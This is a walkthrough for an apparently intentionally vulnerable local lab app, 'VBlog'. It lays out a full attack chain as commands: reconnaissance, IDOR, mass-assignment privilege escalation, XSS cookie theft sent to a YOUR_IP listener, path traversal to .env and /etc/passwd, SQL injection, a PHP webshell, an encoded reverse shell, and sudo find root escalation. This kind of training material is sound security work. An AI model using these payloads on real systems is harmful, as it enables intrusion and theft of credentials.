# VBlog — Walkthrough

> Architecture: [arquitecture.md](arquitecture.md)

---

## Start

```bash
cd VBlog
sudo docker compose up --build -d
```

Open `http://localhost` in the browser.

---

## Phase 0 — Reconnaissance

Find hidden routes:
```bash
gobuster dir -u http://localhost \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -t 50
```
> Finds `/backup`, `/debug`, `/old`, `/internal`, `/admin`

Read exposed credentials:
```bash
curl http://localhost/backup
```
> Returns admin username, password, and DB credentials in plaintext

Read app info:
```bash
curl http://localhost/debug
```
> Returns PHP version, DB driver, user count

Enumerate users without authentication (IDOR):
```bash
for i in $(seq 1 55); do
  echo -n "id=$i: "
  curl -s http://localhost/api/users/$i | grep -o '"role":"[^"]*"'
done
```
> Finds admin at id 52: `"role":"admin"`

Find hidden subdomains:
```bash
gobuster vhost -u http://localhost \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -t 30
```
> Finds `dev.vblog.local`

Add the subdomain and explore the internal panel:
```bash
echo "127.0.0.1  dev.vblog.local" | sudo tee -a /etc/hosts
```
> Open `http://dev.vblog.local/logs.html` in the browser — PostgreSQL connection string and API call traces

---

## Phase 1 — Register and log in

Create account:
```bash
curl -s -X POST http://localhost/api/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"hacker","email":"hacker@test.com","passkey":"password123"}'
```
> `{"status":201,"message":"User created successfully"}`

Log in and save the session cookie:
```bash
curl -s -c /tmp/cookies.txt -X POST http://localhost/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@test.com","passkey":"password123"}'
```
> `{"status":200,"message":"Login correcto"}`

Check your current user and role:
```bash
curl -s -b /tmp/cookies.txt http://localhost/api/me
```
> `{"id":53,"name":"hacker","role":"user"}` — note your ID

---

## Phase 2 — Escalate to admin (Mass Assignment)

Change your role to admin (replace `53` with your ID):
```bash
curl -s -b /tmp/cookies.txt -X PUT http://localhost/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```
> `{"status":200,"user":{"role":"admin",...}}`

Verify you are admin:
```bash
curl -s -b /tmp/cookies.txt http://localhost/api/me
```
> `{"role":"admin"}` — escalation done

Access the admin panel:
> Open `http://localhost/dashboard` in the browser — access granted with no role check

---

## Phase 3 — XSS + Internal panel

Inject XSS into a comment (replace `1` with a valid post ID):
```bash
curl -s -b /tmp/cookies.txt -X POST http://localhost/api/create/comment \
  -H "Content-Type: application/json" \
  -d '{"post_id":1,"content":"<script>alert(document.cookie)</script>"}'
```
> Open the post in the browser — `alert()` fires with the session cookie

Steal any visitor's cookie — open listener:
```bash
python3 -m http.server 8888
```

Inject the steal payload (replace `YOUR_IP`):
```bash
curl -s -b /tmp/cookies.txt -X POST http://localhost/api/create/comment \
  -H "Content-Type: application/json" \
  -d '{"post_id":1,"content":"<script>fetch(\"http://YOUR_IP:8888/?c=\"+document.cookie)</script>"}'
```
> Listener receives: `GET /?c=vblog-session=eyJ...`

Explore the internal panel:
> Open `http://dev.vblog.local/logs.html` — full PostgreSQL connection string

---

## Phase 4 — Path Traversal

Read the app `.env` file:
```bash
curl -s -b /tmp/cookies.txt "http://localhost/api/admin/file?path=.env"
```
> Returns `APP_KEY`, `DB_PASSWORD`, and all configuration

Read system files:
```bash
curl -s -b /tmp/cookies.txt "http://localhost/api/admin/file?path=../../../etc/passwd"
```
> Returns `/etc/passwd` from inside the container

---

## Phase 5 — SQL Injection

Confirm injection:
```bash
curl -s -b /tmp/cookies.txt \
  "http://localhost/api/admin/stats?filter='" \
  -o /dev/null -w "HTTP %{http_code}\n"
```
> `HTTP 500` — PostgreSQL error, injection confirmed

Confirm with time-based blind:
```bash
time curl -s -b /tmp/cookies.txt -G \
  --data-urlencode "filter=%' AND 1=(SELECT 1 FROM pg_sleep(3)) AND tags LIKE '%" \
  "http://localhost/api/admin/stats" -o /dev/null
```
> Response takes ~3 seconds

Dump the users table:
```bash
sqlmap -u "http://localhost/api/admin/stats?filter=test" \
  --cookie="$(grep vblog-session /tmp/cookies.txt | awk '{print $6"="$7}')" \
  --dbms=postgresql --level=3 --risk=2 --batch --dump -T users
```
> Extracts all users with password hashes

---

## Phase 6 — Webshell upload (RCE)

Create and upload the webshell:
```bash
echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > /tmp/shell.php

curl -s -b /tmp/cookies.txt -X POST http://localhost/api/admin/upload \
  -F "file=@/tmp/shell.php;type=image/jpeg"
```
> `{"url":"http://localhost/avatars/shell.php"}`

Execute commands:
```bash
curl -s "http://localhost/avatars/shell.php?cmd=$(echo -n 'id' | base64 -w0)"
```
> `uid=33(www-data) gid=33(www-data)`

---

## Phase 7 — Reverse shell

Open the listener (Terminal 1):
```bash
nc -lvnp 4444
```

Send the reverse shell (Terminal 2):
```bash
curl "http://localhost/avatars/shell.php?cmd=cGhwIC1yICckcz1mc29ja29wZW4oIjE3Mi4xOC4wLjEiLDQ0NDQpOyRwPXByb2Nfb3BlbigiL2Jpbi9iYXNoIC1pIixhcnJheSgwPT4kcywxPT4kcywyPT4kcyksJHBpcGVzKTsn"
```
> Connection arrives at the listener — mute shell with no prompt

Upgrade the shell (in Terminal 1):
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Press `Ctrl+Z`, then:
```bash
stty raw -echo; fg
```
Press Enter twice.
> `www-data@container:/var/www/html$` — full interactive shell

---

## Phase 8 — Escalate to root

Check what www-data can run as root:
```bash
sudo -l
```
> `(root) NOPASSWD: /usr/bin/find`

Option A — GTFOBins with sudo find:
```bash
sudo find . -exec /bin/bash \; -quit
```
```bash
whoami
```
> `root`

Option B — SUID bash:
```bash
/tmp/rootbash -p
whoami
```
> `root`

Explore as root:
```bash
id
cat /etc/shadow
ls -la /root
cat /root/.bash_history
```
> `uid=0(root) gid=0(root)` — full container control
